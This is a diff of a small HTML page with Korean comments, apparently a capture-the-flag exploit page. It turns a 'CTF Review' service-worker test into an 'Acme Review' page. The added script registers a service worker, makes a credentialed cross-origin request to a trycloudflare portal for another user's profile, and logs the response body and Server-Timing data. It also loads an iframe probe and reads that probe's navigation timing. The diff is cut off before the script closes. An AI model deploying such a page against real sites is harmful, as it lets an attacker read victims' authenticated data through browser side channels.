@@ -1,34 +1,87 @@
 
 
 
+
 <!DOCTYPE html>
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
-  <title>CTF Review</title>
+  <title>Acme Review</title>
 </head>
 <body>
-  <h2>CTF Review Page</h2>
+  <h2>Acme Review</h2>
   <pre id="result">Starting...</pre>
 
   <script>
-    const result = document.getElementById("result");
+    const PORTAL = "https://arc-department-copying-food.trycloudflare.com";
+    const output = document.getElementById("result");
+
+    function log(message) {
+      output.textContent += "\n" + message;
+      console.log(message);
+    }
 
     async function main() {
-      if (!("serviceWorker" in navigator)) {
-        result.textContent = "Service Worker unsupported";
-        return;
-      }
-
       try {
         await navigator.serviceWorker.register("./sw.js");
         await navigator.serviceWorker.ready;
 
-        result.textContent =
-          "Service Worker registered successfully";
+        // 현재 페이지를 Service Worker가 제어하도록 새로고침
+        if (!navigator.serviceWorker.controller) {
+          location.reload();
+          return;
+        }
 
-      } catch (error) {
-        result.textContent = error.message;
+        output.textContent = "Service Worker ready";
+
+        // 보고된 origin에서 credentialed CORS 요청
+        const url =
+          PORTAL + "/api/profile/search?username=charlie"
+          + "&t=" + Date.now();
+
+        try {
+          const response = await fetch(url, {
+            credentials: "include",
+            mode: "cors"
+          });
+
+          log("Fetch status: " + response.status);
+          log("Fetch body: " + await response.text());
+
+          const entry =
+            performance.getEntriesByName(url).at(-1);
+
+          log("Fetch Server-Timing: " +
+            JSON.stringify(entry?.serverTiming || []));
+        } catch (e) {
+          log("Fetch error: " + e.message);
+        }
+
+        // 동일 origin의 navigation을 SW가 가로채도록 요청
+        const frame = document.createElement("iframe");
+        frame.src = "./probe?portal=" +
+          encodeURIComponent(PORTAL) +
+          "&t=" + Date.now();
+
+        frame.onload = () => {
+          try {
+            const entries =
+              frame.contentWindow.performance
+                .getEntriesByType("navigation");
+
+            log("Navigation timing: " +
+              JSON.stringify(entries.map(e => ({
+                name: e.name,
+                serverTiming: e.serverTiming
+              }))));
+          } catch (e) {
+            log("Navigation error: " + e.message);
+          }
+        };
+
+        document.body.appendChild(frame);
+      } catch (e) {
+        log("Main error: " + e.message);
       }
     }
 
